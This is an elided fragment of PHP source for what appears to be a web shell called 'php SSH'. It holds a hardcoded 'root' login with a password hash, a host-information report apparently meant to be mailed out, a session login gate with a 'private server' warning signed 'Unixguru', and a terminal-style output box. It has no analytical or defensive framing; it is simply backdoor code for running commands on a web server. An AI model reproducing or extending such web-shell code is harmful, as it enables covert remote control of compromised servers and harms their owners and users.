...
$user[] = "root";                $pass[] = "0d8ed2001197030bb3c7bfbb5e471121";
$to="";
$subject = "php SSH";
$info .= "HOST:\t$HTTP_HOST\n";
...
if (!$_SESSION['user']) {
    ...
    $err = "Invalid login!\n\n";
    $succ = "Warning!
Don`t be stupid .. this is a private server, so take extra care!!! - Unixguru\n\n";
...
<TR>
  <TD HEIGHT="100%" BGCOLOR="#000000" STYLE="padding-top: 5px; padding-left: 5px; padding-right: 5px; padding-bottom: 0px"><TEXTAREA ID="output" 
onSelect="selection_to_clipboard()" onClick="input_focus()" READONLY><?= $out ?></TEXTAREA></TD>
